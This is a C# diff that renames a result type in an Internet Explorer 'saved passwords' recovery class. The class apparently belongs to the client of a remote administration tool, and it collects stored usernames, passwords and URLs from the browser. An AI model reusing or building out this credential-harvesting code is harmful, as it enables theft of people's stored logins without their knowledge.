@@ -7,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using Microsoft.Win32;
+using xClient.Core.Data;
 using xClient.Core.Utilities;
 
 namespace xClient.Core.Recovery.Browsers
@@ -14,9 +15,9 @@ namespace xClient.Core.Recovery.Browsers
     public static class InternetExplorer
     {
         #region Public Members
-        public static List<LoginInfo> GetSavedPasswords()
+        public static List<RecoveredAccount> GetSavedPasswords()
         {
-            List<LoginInfo> data = new List<LoginInfo>();
+            List<RecoveredAccount> data = new List<RecoveredAccount>();
 
             try
             {
@@ -32,7 +33,7 @@ namespace xClient.Core.Recovery.Browsers
                             {
                                 foreach (string[] loginInfo in dataList)
                                 {
-                                    data.Add(new LoginInfo() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Application = "InternetExplorer" });
+                                    data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Application = "InternetExplorer" });
                                 }
                             }
                         }
@@ -51,9 +52,9 @@ namespace xClient.Core.Recovery.Browsers
             return data;
         }
         
-        public static List<LoginInfo> GetSavedCookies()
+        public static List<RecoveredAccount> GetSavedCookies()
         {
-            return new List<LoginInfo>();
+            return new List<RecoveredAccount>();
         }
         #endregion
         #region Private Methods
